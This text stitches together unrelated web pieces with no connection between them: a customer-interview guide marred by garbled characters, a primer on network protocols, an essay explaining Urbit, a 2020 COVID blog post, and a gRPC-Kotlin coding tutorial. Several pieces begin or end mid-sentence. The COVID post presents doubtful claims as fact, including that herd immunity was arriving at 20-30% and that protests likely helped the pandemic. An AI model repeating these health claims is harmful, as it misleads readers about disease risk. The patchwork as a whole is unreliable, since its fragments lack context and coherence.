  <p>To get started can you tell us about yourself, â€˜company_nameâ€™ and your role as a â€˜titleâ€™?</p>
</blockquote>

<p>What made you want to join â€˜companyâ€™? What did you do before this?</p>

<p>From a practical perspective this is helpful for identifying the customer if youâ€™re doing a lot of interviews, but it also helps to understand the individual - their seniority &amp; their motivations.</p>

<p>Can you tell me about the work youâ€™re doing - maybe some of the projects youâ€™re working on, your goals for the quarter, and the challenges youâ€™re facing or trying to solve?</p>

<p>We want to get a sense of a day in the life of the interviewee. Whatâ€™s driving them? Who are they working with? What problems are they solving? These questions will help us to do call-backs later in the interview that a) affirm youâ€™ve been actively listening and b) ground your questions on their lived experience vs hypotheticals.</p>

<h3 id="main-interview">Main Interview</h3>
<blockquote>
  <p>What kinds of user research do you do at â€˜companyâ€™?</p>
</blockquote>

<p>We now want to frame the conversation based on what weâ€™re trying to learn with our interviews. For us this is about user research so we want to first understand what activities theyâ€™re already doing here.</p>

<blockquote>
  <p>What gets in the way of doing great research?</p>
</blockquote>

<p>â€œWhat gets in the way of doing great Xâ€� is a setup Iâ€™ve used multiple times across a range of products. Itâ€™s probably not a question theyâ€™ve been asked lately, and perhaps havenâ€™t thought about before so it often breaks them out of any rote responses theyâ€™ve been giving you so far.</p>

<blockquote>
  <p>What do you think you do well at â€˜companyâ€™ in terms of user research?</p>
</blockquote>

<p>You want to get a better sense of what theyâ€™re proud of. You might find that theyâ€™re doing everything to industry best practices - and you might learn a trick or two.</p>

<blockquote>
  <p>What do you think you could improve in terms of your user research processes?</p>
</blockquote>

<p>How conscious are they of their own weaknesses? Ultimately this question helps to identify problems that your product might be able to help solve.</p>

<p>How do you find candidates to speak to?</p>

<p>This question is potentially overly specific but talks to a series of questions you might ask about the customers work flow. How do they do X, how do they do Y? What problems get in the way of them doing this?</p>

<p>What tools do you use for user research?</p>

<p>What products might you need to integrate with? What things might you replace for the customer?</p>

<blockquote>
  <p>Looking at my notes youâ€™ve listed a bunch of challenges youâ€™re up against:</p>
</blockquote>

<blockquote>
  <ul>
    <li>Challenge 1</li>
    <li>Challenge 2</li>
    <li>Challenge 3</li>
  </ul>
</blockquote>

<blockquote>
  <p>Did I miss any challenges youâ€™ve mentioned or are experiencing?</p>
</blockquote>

<blockquote>
  <p>Would you mind stack ranking these for me? What are the most important ones for you to solve?</p>
</blockquote>

<p>This is the most pivotal question of any interview. Youâ€™ve unearthed a range of problems the customer experiences, but getting them to prioritize these is invaluable. If the problems youâ€™re trying to solve with your product isnâ€™t in the top 3 problem set then you might not be building something people want - or at least not this person / persona.</p>

<p>However if the problem youâ€™re solving is in their top 1-3 problems to solve, you can dive deeper again.</p>

<p>OK so making user research operations more self-serve and scaleable for your product teams is your 2nd biggest pain point. How likely are you to solve that this quarter?</p>

<blockquote>
  <p>How do you plan to solve this problem?</p>
</blockquote>

<blockquote>
  <p>Who else will be involved in helping you fix this?</p>
</blockquote>

<blockquote>
  <p>Do you have a budget allocated to solve it?</p>
</blockquote>

<p>These questions are variations on the question of how high a priority the problem is to solve. We then go further to understand how they might solve the problem - which reveals where they might search for a solution and could aid our marketing; and whether their is budget allocated that could be spent on our solution.</p>

<h3 id="the-pitch">The Pitch</h3>
<blockquote>
  <p>This has been incredibly valuable - thank you!</p>
</blockquote>

<blockquote>
  <p>Now weâ€™d like to tell you a little about the product weâ€™re building to see how it resonates with you.</p>
</blockquote>

<blockquote>
  <p>Weâ€™re building a product to help â€˜customer_typeâ€™ solve â€˜big_hairy_problemâ€™</p>
</blockquote>

<blockquote>
  <p>We help you â€˜product_benefitsâ€™, by â€˜product_featuresâ€™.</p>
</blockquote>

<blockquote>
  <p>How does this product resonate with you? How would something like this fit into your user research practice?</p>
</blockquote>

<p>This pitch is less about selling the customer, more to see how your solution fits into their world view. I always take any reactions here with a grain of salt - unless theyâ€™re keen to trial or use the product.</p>

<p>â€œSounds awesome!â€� is a common refrain, but unless the credit card is coming out I chalk this up to a polite reaction.</p>

<h3 id="outro">Outro</h3>
<blockquote>
  <p>Thanks for taking the time to talk to us, I think we have plenty to go on.</p>
</blockquote>

<blockquote>
  <p>Two last questions for you:
Weâ€™d love to keep in touch to get your feedback on our prototypes as we incorporate feedback from product folks like yourself. Do you mind if we send you the odd question via email?</p>
</blockquote>

<p>Itâ€™s nice to get an opt in for future research. If you have an product you can show them you might ask if you can do a demo and setup time for a future meeting.</p>

<blockquote>
  <p>The second is weâ€™re wondering if  there is anyone else you think we should be talking to? Weâ€™re less looking for introductions than an insight into the types of people and companies you think could provide some insight into their user research process.</p>
</blockquote>

<p>In our case we started talking to product designers, who were awesome but often not responsible for research tooling. They quickly lead us to â€œyou should talk to our product manager / research leadâ€� which was valuable to focus our outreach efforts, and lead to some warm introductions too.</p>

Preface

  <p>I wrote this article to introduce the Internet to a non-technical audience.
In order to get everyone on board,
I first explain basic concepts, such as
<a href="#communication-protocol">communication protocols</a>,
<a href="#network-topologies">network topologies</a>,
and <a href="#signal-routing">signal routing</a>.
The section about <a href="#internet-layers">Internet layers</a> becomes increasingly technical
and peaks with a deep dive into <a href="#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
If the beginning is too elementary for you,
then just skip ahead to more interesting sections.</p>

  <p>Due to the nature of the topic,
this article contains a lot of acronyms.
Many of them are <a href="https://en.wikipedia.org/wiki/Three-letter_acronym">three-letter acronyms (<abbr title="Three-Letter Acronym">TLA</abbr>)</a>,
but some are longer,
which makes them extended three-letter acronyms (<abbr title="Extended Three-Letter Acronym">ETLA</abbr>).
While I introduce most of the acronyms before using them,
you can simply hover over a <abbr title="Three-Letter Acronym">TLA</abbr> or an <abbr title="Extended Three-Letter Acronym">ETLA</abbr> with your mouse
if you forgot what they stand for.
If you are reading this on a touch device,
you have to touch the acronym instead.</p>

  <p>Let’s get right into it:
What is a protocol?</p>

</details>

<h2 id="communication-protocol">Communication protocol</h2>

<h3 id="communication-diagram">Communication diagram</h3>

<p>A <a href="https://en.wikipedia.org/wiki/Communication_protocol">communication protocol</a>
specifies how two parties can exchange information for a specific purpose.
In particular, it determines which messages are to be transmitted in what order.
If the two parties are computers,
a formal, well-defined protocol is easiest to implement.
In order to illustrate what is going on, however,
let’s first look at an informal protocol,
also known as <a href="https://en.wikipedia.org/wiki/Etiquette">etiquette</a>,
which we’re all too familiar with:</p>

</figure>

<p>This is a <a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a>
and it highlights the temporal dimension of a protocol
in which messages are exchanged sequentially.</p>

<h3 id="communication-parties">Communication parties</h3>

<p>It also illustrates that communication is commonly initiated by one party,
whereby the recipient responds to the requests of the initiator.
Please note that this is only the case for one-to-one protocols,
in which each message is intended for a single recipient.</p>

<details>
  <summary id="broadcasting-and-information-security">
Broadcasting and information security
</summary>

  <p>There are also one-to-many protocols for <a href="https://en.wikipedia.org/wiki/Broadcasting">broadcasting</a>.
These are typically one-way protocols,
in which the recipients do not acknowledge the receipt of the transferred data.
Examples for such protocols are analog radio
or churches ringing their bells to indicate the time of day.
Both in the case of a single recipient and in the case of a broad target audience,
anyone with access to the physical medium and the right sensors receives the signal.
The difference is simply that,
in the former case,
entities ignore the messages
which are not addressed to them.
If the messages are not encrypted,
others can still read them, though.
And if the messages are not authenticated,
a malicious party might be able to alter them in transit.
Even when messages are encrypted and authenticated,
their exchange can still be interrupted,
by not relaying some messages
or by <a href="https://en.wikipedia.org/wiki/Radio_jamming">jamming</a> the signal.
The properties Confidentiality, Integrity, and Availability
form the so-called <abbr title="Confidentiality, Integrity, and Availability">CIA</abbr> triad of <a href="https://en.wikipedia.org/wiki/Information_security">information security</a>.</p>

</details>

<h3 id="communication-channel">Communication channel</h3>

<p>The above greeting protocol is used among humans
to establish a <a href="https://en.wikipedia.org/wiki/Communication_channel">communication channel</a> for a longer exchange.
In technical jargon,
such an exchange in preparation for the actual communication is called a <a href="https://en.wikipedia.org/wiki/Handshaking">handshake</a>.
The greeting protocol checks the recipient’s availability and willingness to engage in a conversation.
When talking to someone you have never spoken before,
it also ensures that the recipient understands your language.
I’ve chosen these two examples for their figurative value.
Why we actually <a href="https://en.wikipedia.org/wiki/Greeting">greet</a> each other
is mainly for different reasons:
To show our good intentions by making our presence known to each other,
to signal sympathy and courtesy by asking the superficial question,
and to indicate our relative social status to each other and to bystanders.
Another benefit of asking such a question is that,
even though it’s very shallow,
it makes the responder more likely to do you a favor
due to the psychological effect of
<a href="https://www.influenceatwork.com/principles-of-persuasion/#consistency">commitment and consistency</a>.</p>

a protocol needs to be able to handle deviations:</p>

<p>In order to detect transmission errors,
computers typically append a <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> to each message,
which the recipient then verifies.
The need to <a href="https://en.wikipedia.org/wiki/Retransmission_(data_networks)">retransmit</a> messages
can be reduced by adding redundancy to messages
so that the recipient can <a href="https://en.wikipedia.org/wiki/Error_detection_and_correction">detect and correct small errors</a> on their own.
A simple and very inefficient way of doing this is to repeat the content within each message several times.</p>

<h3 id="connection-loss">Connection loss</h3>

<p>It can also happen that a party loses their connection permanently,
for example by moving too far away for the signal to reach the recipient.
Since a conversation requires some attention from the communication partner,
abandoning a conversation unilaterally without notifying the other party
can be misused to block them from talking to someone else for some time.
In order to avoid binding resources for a prolonged period of time
and thereby potentially falling victim to a so-called
<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a>,
computers drop connections after a configurable duration of inactivity:</p>

  <figcaption>
Bob’s second message (in blue) arrives after his third message (in green).
</figcaption>
</figure>

<p>The solution for this is to enumerate all messages,
to reorder them on arrival,
and to ask the other party to retransmit any missing messages,
as we saw <a href="#data-corruption">above</a>.</p>

<h3 id="lack-of-interoperability">Lack of interoperability</h3>

<p>Besides defining the <a href="https://en.wikipedia.org/wiki/Syntax">syntax</a> (the format),
the <a href="https://en.wikipedia.org/wiki/Semantics">semantics</a> (the meaning),
and the order of the messages,
a protocol should also specify how to handle anomalies like the above.
Ambiguity in a standard
and willful deviation therefrom
result in incompatibilities between different implementations.
In combination with a lack of established standards in many areas,
which often leads to uncoordinated efforts by various parties,
incompatibilities are quite common in computer systems,
unfortunately.
This causes a lot of frustration for users and programmers,
who have to find workarounds for the encountered limitations,
but this cannot be avoided in a free market of ideas and products.</p>

<h2 id="network-topologies">Network topologies</h2>

<h3 id="communication-network">Communication network</h3>

<p>In practice, there are almost always more than two parties
who want to communicate with each other.
Together with the connections between them,
they form a <a href="https://en.wikipedia.org/wiki/Telecommunications_network">communication network</a>.
For the scope of this article,
we’re only interested in symmetric networks,
where everyone who can receive can also send.
This is not the case for analog radio and television networks,
where signals are broadcasted unidirectionally from the sender to the receivers.
In the case of our symmetric networks,
two entities are part of the same network
if they can communicate with each other.
If they cannot reach each other,
they belong to separate networks.</p>

<h3 id="nodes-and-links">Nodes and links</h3>

<p><a href="https://en.wikipedia.org/wiki/Node_(networking)">Nodes</a> are the entities
that communicate with each other over communication <a href="https://en.wikipedia.org/wiki/Data_link">links</a>.
We can visualize this as follows:</p>

</figure>

<p>The terminology is borrowed from <a href="https://en.wikipedia.org/wiki/Graph_theory">graph theory</a>,
where nodes are also called vertices
and links are also called edges.
The technical term for the structure of a network is <a href="https://en.wikipedia.org/wiki/Network_topology">topology</a>.
Different arrangements of nodes and links lead to different characteristics of the resulting network.</p>

<h3 id="fully-connected-network">Fully connected network</h3>

<p>A network is said to be fully connected
if every node has a direct link to every other node:</p>

Fully connected networks scale badly
as the number of links grows quadratically with the number of nodes.
You might have encountered the formula for the number of links before:
n × (n – 1) / 2, with n being the number of nodes in the network.
As a consequence, this topology is impractical for larger networks.</p>

<h3 id="star-network">Star network</h3>

<p>The number of links can be reduced considerably by introducing a central node,
which forwards the communication between the other nodes.
In such a star-shaped network,
the number of links scales linearly with the number of nodes.
In other words,
if you double the number of nodes,
you also double the number of links.
In a fully connected network, you would have quadrupled the number …</p></article></div></div>

<p>it’s been a long time since my last post. in the intervening year i have remained very interested in urbit, completed the introductory hoon course, and began organizing a regional <a href="https://www.meetup.com/Urbit-DFW">meetup group</a>. i’ve also acquired a better technical understanding of the system design. i wrote this essay for our meetup group’s inaugural presentation; you can watch it on youtube <a href="https://www.youtube.com/watch?v=RI1TS0PWQAA">here</a>.</p>

<p>i’ve gotten pretty positive feedback from urbit novices about this, so i hope it’s helpful for anybody else who stumbles upon it. if you notice something that needs a correction, please reach out to me!</p>



<p>by <em>~sitful-hatred</em>; written for urbit dfw meetup 2020.1</p>

<h3 id="introduction">introduction</h3>

<p><a href="http://hyperstition.al/img/slides/slide1.png"><img src="http://hyperstition.al/img/slides/slide1.png#full-center" alt=""></a>urbit is a personal server. that is to say, it’s a computer acts as an agent on your behalf to talk to other computers on the internet. right now, we all use computers that belong to megacorporations and serve their interests; when you log into facebook and talk to your friend, all the real computation and storage is done on servers that belong to facebook. in a very real sense, they own your data. it’s very difficult to avoid at this point. the goal of urbit is to address the technical issues that led to this state of affairs, so that everybody can run and control their own software. there are a lot of projects that have tried to address one or two of the many problems that urbit tries to solve, but i doubt there is any other current project as ambitious or farsighted. urbit is an open source project primarily developed by a company called tlon, in san francisco, and there’s another company in austin also working full-time to develop it, called urbit.live.</p>

<p>urbit is famously difficult to describe; this is due to a combination of complexity, an opaque naming scheme, and its genuinely novel ideas and clever recombinations of old ones. it can seem like it leaked into our world from an alternate timeline. thinking about urbit requires you to modify a lot of conceptual models that you’re used to using to think about computers and the internet. i’m not any kind of expert on any on these subjects but i’ve spent a decent amount of time trying to digest the technical parts of urbit, and my goal here is to convey that understanding to you, and connect the technical decisions and constraints to the problems being solved. this presentation is aimed at someone who has heard of urbit but doesn’t quite get it yet. so, to begin, here is a list of questions:</p>

<p>what if your computer was deterministic – a minimal, strictly defined mathematical function that given an event sequence, always ended up in the same state? how would it be different from the computers we’re used to, and what advantages might it have? what would a network of these computers look like? what if that computation was standardized, so that an app i write today runs on another arbitrary computer in ten years, or the computer i’m using now still works when i pass it down to my kids?</p>

<p>why can’t i take my social graph with me when i leave facebook? why isn’t facebook just a protocol? why has the internet transformed from a peer-to-peer assemblage into a surveillance panopticon? why are we doing all our computation on some corporation’s mainframe as if it’s the 70’s, while they build dossiers on us? what happened to the dream of using networked computers to liberate individuals?</p>

<p>how do you grow social software to internet-scale without running into the obstacles produced by the conflicting values of different communities? how do we preserve the freedoms of association and speech while still allowing for the enforcement of values within groups? how do you disincentivize spam and bad actors in an open system?</p>

<p>as you may guess, some of the goals of urbit are to answer these questions and challenges in an elegant way. i will give you a cursory overview of the system and then talk more about the ideas it exists to implement.</p>

<p><a href="http://hyperstition.al/img/slides/slide2.png"><img src="http://hyperstition.al/img/slides/slide2.png#full-center" alt=""></a></p>

<h3 id="the-stack">the stack</h3>

<p>these problems are very difficult to address within the constraints of the current internet, but urbit is an entire networked computing stack from scratch. the core thesis of urbit is that all of these are technically solvable problems if you approach them at the right scale. i’ll try working from the bottom up here and give a cursory overview without getting too bogged down in details. i apologize if this is a little dense, but bear with me and it should cohere. the second half of this is less technical.</p>

<p><a href="http://hyperstition.al/img/slides/slide3.png"><img src="http://hyperstition.al/img/slides/slide3.png#full-center" alt=""></a></p>

<p>nock is a turing-complete function. you can think of it as the functional assembly code that underpins the entire urbit stack. its formal spec is typically described as “small enough to fit on a t-shirt”, and it has 12 opcodes, or basic instructions. this is a couple of orders of magnitude smaller than the x86_64 instruction set that your pc uses. nock is pared down to the minimum elements of what might make up a useful computer; for instance, it defines a single recursive datatype, a binary tree of integers; and its only arithmetic operator is increment.</p>

<p>but a combinator whose only arithmetic operator is increment sounds unusable as a computer; how do you subtract, for instance?</p>

<p>as you may know, if your computer can increment, you can derive all of the rest of the math you’d like out of that operation – for instance decrementing x by incrementing up to x-1. this is extremely inefficient, but urbit has a cool hack for this: the standard library has all the operations you would expect implemented as “jets”, written in optimized c, which manipulate values in a formally equivalent manner to a specification written in nock. that is to say, if you ran an incredibly slow version of your urbit without jets that did all its math the hard way but otherwise had the same inputs, its state would end up identical to the jetted version.</p>

<p><a href="http://hyperstition.al/img/slides/slide4.png"><img src="http://hyperstition.al/img/slides/slide4.png#full-center" alt=""></a></p>

<p>nock is virtualized with an interpreter programmed in c called vere. vere sits between your urbit and your computer, handing over keyboard and packet inputs to your urbit, and outputs back to your unix computer to be displayed in its terminal or sent off through its network interface. right now urbit runs as a unix process, but one can imagine urbit on hardware meant to run nock and jets directly. for now, vere is what runs your urbit on your macbook or vps.</p>

<p><a href="http://hyperstition.al/img/slides/slide5.png"><img src="http://hyperstition.al/img/slides/slide5.png#full-center" alt=""></a></p>

<p>hoon is the system programming language for the urbit operating system, arvo. hoon is a strongly-typed, functional higher-level language that compiles to nock; it’s effectively a collection of nock macros. expressions are denoted with ‘runes’, which are digraphs of ascii special characters. hoon code is made up of these expressions and as a result can be kind of scary to look at, but i promise it’s not as hard to use as you may think!</p>

<p><a href="http://hyperstition.al/img/slides/slide6.png"><img src="http://hyperstition.al/img/slides/slide6.png#full-center" alt=""></a></p>

<p>arvo is the urbit operating system. it has a minimal kernel, around 1000 lines of code, plus some kernel modules, called vanes. arvo’s vanes handle the networking, apps, a web server, a version-controlled file system, etc. your urbit instance’s arvo begins with a blank slate, then processes any events (packets and keystrokes), writes them to a log, and outputs its effects, producing new events and its new state. if you play back this log, your urbit will end up in an identical state.</p>

<p>urbit is deterministic. your urbit’s state is one giant binary tree that is modified by an event log. nock takes your state and some new event, applies the event to the state, and outputs a new state and a list of effects. arvo orchestrates events between vanes.</p>

<p><a href="http://hyperstition.al/img/slides/slide7.png"><img src="http://hyperstition.al/img/slides/slide7.png#full-center" alt=""></a></p>

<p>the urbit network protocol &amp; kernel module is called ames. ames is peer-to-peer and encrypted, and runs over udp. it has a global immutable namespace; an instance’s name is permanent, and is both an identity and routing address.
urbit’s address space is 128-bit, just like ipv6. the total number of addresses (or ‘ships’) is effectively unlimited. however, urbit’s address space is also partitioned into classes with different privileges. 8-bit address ships are called galaxies, which are core infrastructure nodes that sign software updates. underneath galaxies are stars, 16-bit address ships that act as routing infrastructure. beneath stars are planets, which are ships meant for individual humans. planet addresses are 32-bit like ipv4, so there’s about 4.2 billion of them. galaxies issue stars, and stars issue planets.</p>

<p>urbit uses a base-256 phonemic scheme for pronouncible numbers called @p. galaxies have single-syllable names like ~zod; stars are two-syllable, like ~marzod. planets have two two-syllable names, like ~dalsum-simreg. this is your identity – think of it as a combination ip &amp; email address. the words are human-memorable and sound like cool sci-fi names.</p>

<p><a href="http://hyperstition.al/img/slides/slide8.png"><img src="http://hyperstition.al/img/slides/slide8.png#full-center" alt=""></a></p>

<p>how do you own these names? urbit’s public key infrastructure is a set of ethereum contracts collectively called azimuth. azimuth acts as an ownership registry for ships and consensus mechanism for network governance. if you receive a ship, your proof of ownership is an erc-721 token, which is an ethereum standard for non-fungible tokens. you own this token like you own bitcoin; as long as you have the master password, it belongs to you forever.</p>

<p>azimuth technically exists outside of urbit as a general-purpose pki; urbit just uses it as a source of truth. if you dislike ethereum for political or technical reasons, keep in mind that it’s not a permanent intrinsic part of how urbit works, it’s just the current scheme – though in my opinion it’s a pretty elegant solution.</p>

<h3 id="philosophy">philosophy</h3>

<p>urbit has very strong opinions, and some design decisions that might not make immediate sense. this is a system meant to replace the internet we’ve spent half a century building; it needs some really compelling wins to be serious.</p>

<p>for instance, why make a computer with such a minimal core? so you can freeze it and standardize it.</p>

<p><a href="http://hyperstition.al/img/slides/slide9.png"><img src="http://hyperstition.al/img/slides/slide9.png#full-center" alt=""></a></p>

<p>a basic idea underlying the design of urbit is that many of the problems we have today with the way networked computers work is that the technologies composing them accrued in layers atop each other in ways that produce unforeseen conflicts. …</p></div></div>

				<div id="speakaboutWrapper"><p>Ok so this is not at all agreed upon. The CDC has<a href="https://www.cdc.gov/coronavirus/2019-ncov/covid-data/mathematical-modeling.html"> twenty-one different models</a> forecasting cases and deaths. Those forecasts are only shown on the CDC website to predict what will happen for about the next two weeks- until September 12th. The models are from various universities and teams- MIT has two models, Harvard has a model, Columbia University, Hopkins, Georgia Tech, Notre Dame, etc. etc. (the usual suspects). And even in that short time frame, they are all over the place.</p>



<p>Why are they all over the place? Well the biggest thing is that they make different assumptions about social distancing and behavior- it will continue as it is or change. Also some of them are assuming herd immunity, ahem, and some not. The Columbia-UNC model appears to assume herd immunity as it is predicting a decline in cases and not saying anything about social distancing (see below).</p>

That doesn’t tell us how this ends.</p>



<figure><blockquote><p>I actually have been in a pretty good mood lately because I think this ends soon and with less deaths than I originally thought. That doesn’t mean that this was in any way ok or a lot of people won’t have died. This was most definitely NOT ok, any of it. 220,000 people have already died- more than 6X the Flu. And this was preventable. So 100% not ok.</p></blockquote></figure><p>But here is what I think will happen. I think herd immunity is happening and I actually think that my original idea and<a href="https://www.bcg.com/en-us/publications/2020/protecting-vulnerable-populations-protects-all-populations"> the idea Boston Consulting Group’s (BCG) COVID-19 team was promoting</a>, actually naturally is occurring. I think the public health messaging got out there and the highest risk people are being more shielded than in the beginning of the pandemic. Whether that’s them being more careful or their families being more careful around them, the age of cases has dropped and thus the death rate is dropping. Proud of you America. Your government sucks but you are looking out for the vulnerable people on your own. </p>



<p>I actually think the protests were probably in some senses GOOD for this pandemic because the people protesting were by and large low-risk for dying of COVID. They were younger and probably most didn’t have a condition that put them at high risk- like asthma or cancer. Therefore the herd immunity we are seeing at 20-30% is a healthier 20-30% of the population. They are shielding the more vulnerable people from COVID with their immunity. That’s not to say anything about disparities- that’s a whole other can of worms that is terrible and I won’t get into here. </p>



<p>But bottom line? Cases are dropping and deaths are not as bad as we thought. Achieving herd immunity at 20-30% is huge! It is an unexpected and really lucky turn of events. I thought it would be at 60-70% and have a lot more deaths involved. </p>

<figure><blockquote><p>The herd immunity threshold depends on how responsible people are being. More mask wearing, more distancing, and more protecting of high-risk people will make herd immunity possible at lower levels. It will also save lives. So we need to keep doing this until the cases drop completely. </p></blockquote></figure><figure><img loading="lazy" width="1024" height="652" src="https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1024x652.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1024x652.png 1024w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-300x191.png 300w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-768x489.png 768w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1536x978.png 1536w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1200x764.png 1200w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-942x600.png 942w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-960x611.png 960w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1884x1200.png 1884w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior..png 2038w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>From UCSF grand rounds talk by Dr. Trevor Bedford.</figcaption></figure><p>I think it won’t be that much longer though.

<p>But I think cases will have dropped enough and we will be immune enough for things to feel a lot more normal by Christmas. And a vaccine will be here in ~January 2021. The memorial day 2021 parties are going to be spectacular. This is what Wuhan province looks like- you know the place in China that originally locked down and then eradicated COVID. It’s off the hook there. Please someone start planning this pool party for me. Really- that looks amazing.</p>

        <p>In this blog post, we will explore how to use gRPC with Kotlin coroutines on both the server and client (Android) using the <a href="https://github.com/grpc/grpc-kotlin">gRPC-Kotlin</a> library.</p>

<h2 id="what-is-grpc">What is gRPC?</h2>

<p><a href="https://grpc.io/docs/what-is-grpc/introduction/">gRPC</a> is a framework by Google for making RPC requests. It allows you to call a method on the server as if it was a local method on the client. The server defines all the different types of RPC requests the client could make using protocol buffers. <a href="https://developers.google.com/protocol-buffers">Protocol buffers</a> is a data formatting language. It allows you to specify the request and response from rpc calls.</p>

<p>gRPC has support for clients and servers that are built using different programming languages.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-1.png" alt="client-server-diagram"></p>

<h2 id="use-case">Use Case</h2>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-2.png" alt="client-server-user-case"></p>

<p>Assume we are building an Android app that allows users to explore locations on map as they traverse from one location to another. The user may be able to check-in to a place or chat with others at the location. The user could also explore new venues such as restaurants and retail stores nearby. How could we build a server and client for this hypothetical use case?</p>


<h2 id="building-grpc-server">Building gRPC Server</h2>

<p>There are many open source libraries that could be used to build a gRPC server and client such as <a href="https://github.com/square/wire">Wire</a>, <a href="https://github.com/marcoferrer/kroto-plus">Kroto-Plus</a> and <a href="https://github.com/grpc/grpc-kotlin">gRPC-Kotlin</a>. Let’s explore how to use gRPC-Kotlin to build a gRPC server for our case.</p>

<h3 id="rpc-calls">RPC Calls</h3>

<p>The first step is to define the RPC calls a client could make. We’ll use protocol buffers to define the request and response. The RPC calls are defined in a file with an extension <code>.proto</code>. All RPC calls are defined in a service. The snippet below defines <code>VenueService</code> using the <a href="https://developers.google.com/protocol-buffers/docs/proto#services"><code>service</code></a> keyword. The proto file also specifies the version of protocol buffer to use. I have specified to use <a href="https://developers.google.com/protocol-buffers/docs/proto3">protocol buffer version 3</a>.</p>

<div><div><pre><code><span>syntax</span> <span>=</span> <span>"proto3"</span>

<span>service</span> <span>VenueService</span> <span>{</span>

<span>}</span>
</code></pre></div></div>

<h4 id="unary-rpc-call">Unary RPC Call</h4>

<p>The first RPC call type we will define is a simple client and server request. Suppose in our use case, we wanted to get a venue (restaurant, retail store) at a particular location. We could define this RPC call as follows.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>The <code>GetVenue</code> method takes in a <code>Location</code> message and returns a <code>Venue</code>.</p>

<div><div><pre><code><span>message</span> <span>Location</span> <span>{</span>
   <span>double</span> <span>latitude</span> <span>=</span> <span>1</span><span>;</span>
   <span>double</span> <span>longitude</span> <span>=</span> <span>2</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>A type is defined using the <code>message</code> keyword. <code>Location</code> is a message that has two fields - latitude and longitude. These fields have a type of <code>double</code>. The <a href="https://developers.google.com/protocol-buffers/docs/proto#scalar">Protocol Buffer Guide</a> defines all the supported types such as enums or strings. Each field is assigned a unqiue number starting from 1. For each field defined subsequently, the unique number is incremented.</p>

<div><div><pre><code><span>message</span> <span>Venue</span> <span>{</span>
   <span>string</span> <span>name</span> <span>=</span> <span>1</span><span>;</span>
   <span>Location</span> <span>location</span> <span>=</span> <span>2</span><span>;</span>
   <span>VenueType</span> <span>venueType</span> <span>=</span> <span>3</span><span>;</span>

   <span>enum</span> <span>VenueType</span> <span>{</span>
     <span>Landmark</span> <span>=</span> <span>0</span><span>;</span>
     <span>Driving_Range</span> <span>=</span> <span>1</span><span>;</span>
     <span>Golf_Course</span> <span>=</span> <span>2</span><span>;</span>
     <span>Restaurant</span> <span>=</span> <span>3</span><span>;</span>
     <span>Retail</span> <span>=</span> <span>4</span><span>;</span>
   <span>}</span>

   <span>int64</span> <span>checkins</span> <span>=</span> <span>4</span><span>;</span>
   <span>int64</span> <span>reviews</span> <span>=</span> <span>5</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>A <code>Venue</code> is represented as a message above. The name of the venue is a <code>string</code>. It references an existing message <code>Location</code> to return the latitude and longitude of the venue. The third field is an enum which represents the type of venue - landmark, driving range, restaurant or retail store. Each enum is specified with a unique number starting from 0. The last two fields checkins and reviews are int scalar types. In Kotlin, they map to a Long.</p>

<p>We have specified a simple unary RPC call that returns a venue based on a location.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<h4 id="server-streaming">Server Streaming</h4>

<p>The <code>GetVenue</code> RPC call above returns only one response. But, we could define RPC calls where the server returns a stream of data. Assume we wanted to define an RPC where the client gives a location and the server returns a stream of venues nearby.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-3.png" alt="server-side-streaming"></p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

    <span>rpc</span> <span>listVenues</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Venue</span><span>)</span> <span>{</span> <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We have added a server streaming RPC call to the service above. What’s new about this call specification? The return type <code>Venue</code> is marked with a <code>stream</code> keyword. This specifies that the returned data from the server will stream venues. The server will wait until the client send a message. Once it has a message, it will return a stream of responses.</p>

<h4 id="client-streaming">Client Streaming</h4>

<p>We saw in the server side streaming example that server was returning a stream of messages. The client only had sent one message. Client could also send a stream of messages.</p>

<p>Assume we wanted to return a summary of all the venues a person visted during their trip. For this use case, the client will have to send a stream of locations as they go from one location to another.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-4.png" alt="client-side-streaming"></p>

<p>In this diagram, the client is sending a stream of locations to the server. The server will wait until al the messages are received and send back a summary back to the client.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>RecordTrip</span><span>(</span><span>stream</span> <span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>TripSummary</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

